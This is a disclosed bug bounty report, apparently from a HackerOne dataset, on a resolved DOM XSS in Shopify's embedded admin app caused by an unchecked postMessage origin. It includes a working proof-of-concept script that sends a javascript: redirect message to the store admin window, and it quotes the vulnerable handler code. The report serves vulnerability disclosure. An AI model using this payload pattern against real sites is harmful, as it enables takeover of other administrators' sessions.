---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '576532'
original_report_id: '576532'
title: DOM XSS via Shopify.API.remoteRedirect
weakness: Cross-site Scripting (XSS) - DOM
team_handle: shopify
created_at: '2019-05-10T15:05:16.793Z'
disclosed_at: '2019-06-05T23:24:37.469Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 15
asset_identifier: your-store.myshopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-dom
---

# DOM XSS via Shopify.API.remoteRedirect

## Metadata

- HackerOne Report ID: 576532
- Weakness: Cross-site Scripting (XSS) - DOM
- Program: shopify
- Disclosed At: 2019-06-05T23:24:37.469Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

hi, team, after I read the report #422043, I found another monitor postmessage, and did not correctly verify the origin, leading to dom xss, using the store theme can write js this feature, we can modify a theme for the following Payload, 
```
<script>
  function attack(){
  	var ctx=window.open('https://cuxuri.myshopify.com/admin/themes');
    var interval;
    interval=setInterval(function(){
      if(window.attackSuccess){
        clearInterval(interval);
      }else{
        ctx.postMessage(`{"message":"Shopify.API.remoteRedirect","data":{"location":"javascript:alert(document.domain)"}}`);
      }
    },500);;
  }
</script>
<a href="javascript:attack()" style="display:block;text-align:center;width:100%;height:300px;line-height:300px;background:#000;color:#fff;">click me start attack</a>
```
then log in to the store, access the page containing the payload, you can trigger xss, 
such as:

{F487966}

Problem code:
```
https://cdn.shopifycloud.com/web/assets/latest/embeddedApp-ab64a8a13eb3f06403cb2acf67e20576a144bf2d3625807923872e8adf469a14.js
case de.RemoteRedirect:
                            this.handleRemoteRedirect(t.location);
                            break;
```

## Impact

Attack other administrators

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
